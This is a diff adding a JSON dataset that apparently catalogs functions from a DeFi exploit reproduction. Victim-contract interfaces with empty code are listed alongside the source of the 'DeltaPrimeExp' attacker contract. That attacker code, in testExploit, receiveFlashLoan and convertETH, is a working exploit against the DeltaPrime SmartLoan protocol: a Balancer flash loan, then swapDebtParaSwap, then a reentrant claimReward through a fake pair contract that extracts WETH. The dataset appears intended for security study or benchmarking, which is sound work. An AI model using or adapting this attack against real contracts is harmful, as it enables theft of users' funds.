@@ -1,0 +1,170 @@
+[
+  {
+    "contract/interface": "ISimpleSwap",
+    "source_type": "victim_contract",
+    "function_name": "simpleSwap",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakePairContract",
+    "source_type": "victim_contract",
+    "function_name": "claim",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakePairContract",
+    "source_type": "victim_contract",
+    "function_name": "getLBHooksParameters",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakePairContract",
+    "source_type": "victim_contract",
+    "function_name": "getRewardToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISmartLoan",
+    "source_type": "victim_contract",
+    "function_name": "claimReward",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISmartLoan",
+    "source_type": "victim_contract",
+    "function_name": "isSolvent",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISmartLoan",
+    "source_type": "victim_contract",
+    "function_name": "swapDebtParaSwap",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISmartLoan",
+    "source_type": "victim_contract",
+    "function_name": "wrapNativeToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISmartLoansFactoryTUP",
+    "source_type": "victim_contract",
+    "function_name": "createLoan",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "convertETH",
+    "original_code": "    function convertETH() external {\n        string memory priceDataPath = \"./src/test/2024-11/DelatPrimePriceData.txt\";\n        bytes memory priceData = vm.parseBytes(vm.readFile(priceDataPath));\n        bytes memory wrapNativeTokenData =\n            abi.encodePacked(abi.encodeCall(ISmartLoan.wrapNativeToken, (address(SmartLoan).balance)), priceData);\n\n        address(SmartLoan).call(wrapNativeTokenData); // convert collateral eth to weth, claim weth as reward asset\n            // SmartLoan.wrapNativeToken(address(SmartLoan).balance);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        WETH.withdraw(WETH.balanceOf(address(this))); // withdraw weth to eth\n\n        address(SmartLoan).call{value: address(this).balance}(\"\"); // transfer eth to SmartLoan as collateral\n\n        bytes memory data = castCallData();\n        string memory priceDataPath = \"./src/test/2024-11/DelatPrimePriceData.txt\";\n        bytes memory priceData = vm.parseBytes(vm.readFile(priceDataPath));\n        bytes memory swapDebtParaSwapData = abi.encodePacked(\n            abi.encodeCall(\n                ISmartLoan.swapDebtParaSwap, (_fromAsset, _toAsset, _repayAmount, _borrowAmount, selector, data)\n            ),\n            priceData\n        );\n\n        address(SmartLoan).call(swapDebtParaSwapData); // SmartLoan borrow eth,\n        // SmartLoan.swapDebtParaSwap(_fromAsset, _toAsset, _repayAmount, _borrowAmount, selector, data)\n\n        uint256[] memory ids = new uint256[](1);\n        ids[0] = 0;\n        bytes memory claimRewardData =\n            abi.encodePacked(abi.encodeCall(ISmartLoan.claimReward, (address(fakePairContract), ids)), priceData);\n\n        address(SmartLoan).call(claimRewardData); // triger reenter attack, convert collateral and debt eth to weth and claim as reward\n        // SmartLoan.claimReward(address(fakePairContract), ids);\n\n        WETH.transfer(address(Balancer), flashLoanAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() external {\n        vm.deal(address(this), 0 ether);\n        vm.createSelectFork(\"arbitrum\", 273_278_741);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(SmartLoansFactoryTUP), \"SmartLoansFactoryTUP\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "DeltaPrimeExp",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance before exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        SmartLoan = ISmartLoan(SmartLoansFactoryTUP.createLoan()); // create an attacker position contract\n        vm.label(address(SmartLoan), \"SmartLoan\");\n        fakePairContract = new FakePairContract(); // create a fakePair contract\n        vm.label(address(fakePairContract), \"fakePairContract\");\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = WETH.balanceOf(address(Balancer));\n        flashLoanAmount = amounts[0];\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
+    "description": ""
+  }
+]
